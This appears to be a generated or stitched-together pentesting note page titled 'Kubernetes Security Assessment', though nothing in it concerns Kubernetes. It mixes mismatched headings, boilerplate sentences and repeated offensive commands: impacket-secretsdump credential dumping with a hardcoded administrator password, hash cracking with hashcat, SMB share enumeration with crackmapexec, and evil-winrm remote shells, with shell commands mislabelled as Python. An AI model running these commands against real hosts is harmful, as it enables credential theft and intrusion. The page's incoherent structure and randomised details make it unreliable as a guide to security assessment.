---
TitleSEO: "Kubernetes Security Assessment | ZureFX"
TitlePost: "Kubernetes Security Assessment"
Author: "ZureFX"
Description: "Personal notes on Kubernetes Security Assessment. Quick reference for pentesting and CTF challenges."
Keywords: "linux, privilege escalation, dfir"
URL: "https://zurefx.github.io/notes/note-kubernetes-security-assessment-217.html"
URL_IMAGES: ""
Date: "2024-11-21"
Tags: "Linux, Privilege Escalation, DFIR"
Section: "notes"
Lang: "en"
main_img: "note-kubernetes-security-assessment-217"
Permalink: "/notes/note-kubernetes-security-assessment-217.html"
BtnLabel: "Read Notes"
Pick: 0
---
## DCSync

### john

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.22.34
nmap -sCV -p8443,464,995 10.129.196.148 -oN scan.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.95.215.146
```

```python
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.36.14.161
impacket-secretsdump administrator:'P@ssw0rd!'@10.43.231.60
feroxbuster -h
```

```python
nmap -sCV -p5432,80,993 10.29.94.88 -oN scan.txt
gobuster dir -u http://10.21.93.134/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p636,1521,464 10.87.85.132 -oN scan.txt
crackmapexec smb 10.117.181.151 -u administrator -p 'P@ssw0rd!' --shares
```

## Laravel

### atexec

Authentication bypass was achieved through careful manipulation of the login mechanism. Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.55.101
```

## SeDebugPrivilege

### CSRF

```bash
evil-winrm -i 10.17.226.27 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.
